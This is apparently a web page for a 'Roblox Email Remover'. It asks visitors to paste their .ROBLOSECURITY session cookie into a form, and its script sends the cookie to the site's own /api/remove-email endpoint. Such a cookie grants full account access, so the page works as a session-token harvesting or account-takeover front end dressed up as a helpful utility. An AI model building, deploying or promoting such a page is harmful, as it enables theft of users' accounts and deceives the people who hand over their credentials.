<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Roblox Email Remover</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 min-h-screen flex items-center justify-center">
  <div class="bg-white shadow-lg rounded-lg p-8 w-full max-w-md">
    <h1 class="text-2xl font-semibold text-center text-gray-800 mb-6">🔒 Roblox Email Remover</h1>

    <form id="form" class="space-y-4">
      <div>
        <label for="cookie" class="block text-sm font-medium text-gray-700 mb-1">.ROBLOSECURITY Cookie</label>
        <textarea id="cookie" rows="5" class="w-full px-3 py-2 border rounded-lg shadow-sm focus:ring focus:ring-green-200 focus:outline-none" placeholder="Paste your .ROBLOSECURITY cookie here" required></textarea>
      </div>

      <button type="submit" class="w-full bg-green-500 hover:bg-green-600 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">
        🚀 Remove Email
      </button>
    </form>

    <p id="result" class="mt-4 text-center text-sm text-gray-700 font-medium"></p>
  </div>

  <script>
    const form = document.getElementById('form');
    const result = document.getElementById('result');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      result.textContent = '⏳ Processing...';

      const res = await fetch('/api/remove-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookie: document.getElementById('cookie').value })
      });

      const data = await res.json();
      result.textContent = data.message || (data.success ? '✅ Success' : '❌ Failed');
      result.classList.remove('text-gray-700', 'text-green-500', 'text-red-500');
      result.classList.add(data.success ? 'text-green-500' : 'text-red-500');
    });
  </script>
</body>
</html>
